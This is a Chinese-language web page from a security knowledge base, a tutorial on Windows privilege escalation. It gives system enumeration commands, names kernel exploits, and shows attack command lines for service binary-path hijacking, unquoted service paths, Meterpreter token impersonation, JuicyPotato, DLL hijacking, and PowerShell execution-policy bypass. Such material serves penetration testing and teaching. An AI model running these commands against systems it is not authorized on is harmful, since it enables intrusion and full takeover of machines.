<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Windows提权技术完全手册 - XHSecTeam安全知识库</title>
    <meta name="description" content="系统讲解Windows环境下的各种提权方法：内核漏洞提权、服务提权、令牌窃取、DLL劫持、计划任务等技术详解。">
    <meta name="keywords" content="Windows提权,权限提升,内核漏洞,服务提权,令牌窃取,DLL劫持,后渗透">
    <meta name="author" content="XHSecTeam">
    <meta name="robots" content="index, follow">
    
    <link rel="stylesheet" href="../../static/css/common.css">
    <script src="../../static/css/common.js"></script>
    <script src="../../static/js/layout.js"></script>
    <style>
        .article-container { max-width: 1200px; margin: 0 auto; padding: 24px 32px 60px; }
        .article-layout { display: grid; grid-template-columns: 1fr 280px; gap: 40px; }
        .article-header { margin-bottom: 32px; }
        .article-breadcrumb { display: flex; align-items: center; gap: 8px; font-size: 13px; color: var(--text-tertiary); margin-bottom: 16px; }
        .article-breadcrumb a { color: var(--text-secondary); text-decoration: none; }
        .article-breadcrumb a:hover { color: var(--accent-green); }
        .article-breadcrumb svg { width: 14px; height: 14px; fill: none; stroke: currentColor; stroke-width: 2; }
        .article-title { font-size: 32px; font-weight: 800; color: var(--text-primary); line-height: 1.3; margin-bottom: 16px; }
        .article-meta { display: flex; align-items: center; gap: 20px; flex-wrap: wrap; font-size: 13px; color: var(--text-secondary); }
        .article-meta-item { display: flex; align-items: center; gap: 6px; }
        .article-meta-item svg { width: 16px; height: 16px; fill: none; stroke: currentColor; stroke-width: 2; color: var(--text-tertiary); }
        .article-badge { padding: 3px 10px; border-radius: 999px; font-size: 12px; font-weight: 600; background: rgba(245, 158, 11, 0.1); color: #d97706; border: 1px solid rgba(245, 158, 11, 0.3); }
        .article-tags { display: flex; gap: 8px; margin-top: 16px; flex-wrap: wrap; }
        .article-tag { padding: 4px 12px; border-radius: 999px; font-size: 12px; background: rgba(59, 130, 246, 0.08); color: #3b82f6; border: 1px solid rgba(59, 130, 246, 0.2); text-decoration: none; }
        .article-content { background: rgba(255, 255, 255, 0.96); border: 1px solid rgba(148, 163, 184, 0.2); border-radius: 16px; padding: 32px; }
        .article-content h2 { font-size: 22px; font-weight: 700; color: var(--text-primary); margin: 32px 0 16px; padding-bottom: 10px; border-bottom: 2px solid rgba(16, 185, 129, 0.3); }
        .article-content h2:first-child { margin-top: 0; }
        .article-content h3 { font-size: 18px; font-weight: 600; color: var(--text-primary); margin: 24px 0 12px; }
        .article-content p { font-size: 15px; line-height: 1.8; color: var(--text-secondary); margin-bottom: 16px; }
        .article-content ul { margin: 16px 0; padding-left: 24px; }
        .article-content li { font-size: 15px; line-height: 1.8; color: var(--text-secondary); margin-bottom: 8px; }
        .article-content code { background: rgba(16, 185, 129, 0.08); color: var(--accent-green); padding: 2px 8px; border-radius: 4px; font-family: monospace; font-size: 14px; }
        .article-content pre { background: #1e293b; border-radius: 12px; padding: 20px; overflow-x: auto; margin: 20px 0; }
        .article-content pre code { background: none; color: #e2e8f0; padding: 0; font-size: 13px; line-height: 1.6; }
        .article-sidebar { display: flex; flex-direction: column; gap: 20px; }
        .article-toc { background: rgba(255, 255, 255, 0.96); border: 1px solid rgba(148, 163, 184, 0.2); border-radius: 12px; padding: 20px; position: sticky; top: 24px; }
        .article-toc-title { font-size: 14px; font-weight: 600; color: var(--text-primary); margin-bottom: 14px; }
        .article-toc-list { display: flex; flex-direction: column; gap: 10px; }
        .article-toc-item { font-size: 13px; color: var(--text-secondary); text-decoration: none; padding-left: 12px; border-left: 2px solid transparent; }
        .article-toc-item:hover { color: var(--accent-green); }
        .article-nav { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 40px; padding-top: 32px; border-top: 1px solid rgba(148, 163, 184, 0.2); }
        .article-nav-item { padding: 20px; background: rgba(255, 255, 255, 0.96); border: 1px solid rgba(148, 163, 184, 0.2); border-radius: 12px; text-decoration: none; }
        .article-nav-item:hover { border-color: var(--accent-green); }
        .article-nav-label { font-size: 12px; color: var(--text-tertiary); margin-bottom: 6px; }
        .article-nav-title { font-size: 14px; font-weight: 600; color: var(--accent-green); }
        .article-nav-item.next { text-align: right; }
        @media (max-width: 960px) { .article-layout { grid-template-columns: 1fr; } }
    </style>
</head>
<body>
    <div class="main-layout" style="margin-left: 0; margin-right: 0;">
        <article class="content article-container" itemscope itemtype="https://schema.org/TechArticle">
            <header class="article-header">
                <nav class="article-breadcrumb">
                    <a href="../index.html">知识库</a>
                    <svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
                    <a href="../index.html?cat=redteam">红队攻防</a>
                    <svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
                    <span>Windows提权</span>
                </nav>
                <h1 class="article-title" itemprop="headline">Windows提权技术完全手册</h1>
                <div class="article-meta">
                    <span class="article-badge">中危</span>
                    <div class="article-meta-item">
                        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
                        <time datetime="2024-12-02">2024-12-02</time>
                    </div>
                    <div class="article-meta-item">
                        <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                        <span>920 阅读</span>
                    </div>
                </div>
                <div class="article-tags">
                    <a href="#" class="article-tag">提权</a>
                    <a href="#" class="article-tag">Windows</a>
                    <a href="#" class="article-tag">后渗透</a>
                </div>
            </header>
            
            <div class="article-layout">
                <div class="article-content" itemprop="articleBody">
                    <h2 id="intro">一、信息收集</h2>
                    <p>提权前需要收集系统信息，判断可用的提权方法：</p>
                    <pre><code># 系统信息
systeminfo
hostname
whoami /all

# 网络信息
ipconfig /all
netstat -ano

# 用户和组
net user
net localgroup administrators

# 已安装软件
wmic product get name,version

# 查找补丁
wmic qfe get Caption,Description,HotFixID,InstalledOn</code></pre>
                    
                    <h2 id="kernel">二、内核漏洞提权</h2>
                    <p>利用系统未打补丁的内核漏洞进行提权：</p>
                    <pre><code># 常见内核提权漏洞
MS16-032 (Secondary Logon Handle)
MS15-051 (Win32k Elevation)
MS14-058 (Win32k.sys)
CVE-2021-1732 (Win32k)
PrintNightmare (CVE-2021-34527)

# 使用工具检测
windows-exploit-suggester.py --database 2024-01-01.xlsx --systeminfo sysinfo.txt</code></pre>
                    
                    <h2 id="service">三、服务提权</h2>
                    
                    <h3>3.1 不安全的服务权限</h3>
                    <pre><code># 查找可修改的服务
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

# 修改服务二进制路径
sc config VulnService binpath= "C:\temp\shell.exe"
sc start VulnService</code></pre>
                    
                    <h3>3.2 不带引号的服务路径</h3>
                    <pre><code># 查找不带引号的路径
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# 利用方式：如果路径是 C:\Program Files\Vuln Service\service.exe
# 可以放置 C:\Program.exe 来劫持</code></pre>
                    
                    <h2 id="token">四、令牌窃取</h2>
                    <pre><code># 使用Meterpreter
meterpreter> use incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token "NT AUTHORITY\SYSTEM"

# 使用Potato提权
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t *</code></pre>
                    
                    <h2 id="dll">五、DLL劫持</h2>
                    <p>利用应用程序加载DLL的搜索顺序漏洞：</p>
                    <ul>
                        <li>查找程序加载的DLL</li>
                        <li>确定可写目录</li>
                        <li>放置恶意DLL到搜索路径中</li>
                    </ul>
                    <pre><code># 使用Process Monitor监控DLL加载
# 过滤条件：Path contains .dll AND Result is NAME NOT FOUND</code></pre>
                    
                    <h2 id="schedule">六、计划任务</h2>
                    <pre><code># 查看计划任务
schtasks /query /fo LIST /v

# 查找可写的计划任务脚本
accesschk.exe -dqv "C:\Scripts"</code></pre>
                    
                    <h2 id="tools">七、自动化工具</h2>
                    <ul>
                        <li><strong>WinPEAS</strong>：全面的Windows提权枚举工具</li>
                        <li><strong>PowerUp</strong>：PowerShell提权脚本</li>
                        <li><strong>BeRoot</strong>：权限检查工具</li>
                        <li><strong>Seatbelt</strong>：C#安全审计工具</li>
                    </ul>
                    
                    <pre><code># WinPEAS
winPEASany.exe

# PowerUp
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks</code></pre>
                </div>
                
                <aside class="article-sidebar">
                    <nav class="article-toc">
                        <h2 class="article-toc-title">目录</h2>
                        <div class="article-toc-list">
                            <a href="#intro" class="article-toc-item">一、信息收集</a>
                            <a href="#kernel" class="article-toc-item">二、内核漏洞提权</a>
                            <a href="#service" class="article-toc-item">三、服务提权</a>
                            <a href="#token" class="article-toc-item">四、令牌窃取</a>
                            <a href="#dll" class="article-toc-item">五、DLL劫持</a>
                            <a href="#schedule" class="article-toc-item">六、计划任务</a>
                            <a href="#tools" class="article-toc-item">七、自动化工具</a>
                        </div>
                    </nav>
                </aside>
            </div>
            
            <nav class="article-nav">
                <a href="file-upload-bypass.html" class="article-nav-item prev">
                    <div class="article-nav-label">← 上一篇</div>
                    <div class="article-nav-title">文件上传漏洞绕过技术汇总</div>
                </a>
                <a href="sql-injection-guide.html" class="article-nav-item next">
                    <div class="article-nav-label">下一篇 →</div>
                    <div class="article-nav-title">SQL注入攻击完全指南</div>
                </a>
            </nav>
        </article>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', async function() {
            XHLayout.loadFooter();
        });
    </script>
</body>
</html>
